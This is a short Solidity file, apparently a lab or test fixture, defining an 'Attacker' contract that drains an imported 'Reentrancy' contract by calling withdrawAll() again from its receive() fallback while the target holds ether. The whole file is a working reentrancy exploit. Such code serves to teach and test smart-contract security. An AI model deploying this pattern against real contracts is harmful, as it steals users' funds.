// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { Reentrancy } from "./Reentrancy.sol";

contract Attacker {
    Reentrancy public target;

    constructor(address _target) {
        target = Reentrancy(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawAll();
        }
    }

    function deposit() public payable {
        target.deposit{ value: msg.value }();
    }

    function attack() public payable {
        target.withdrawAll();
    }
}
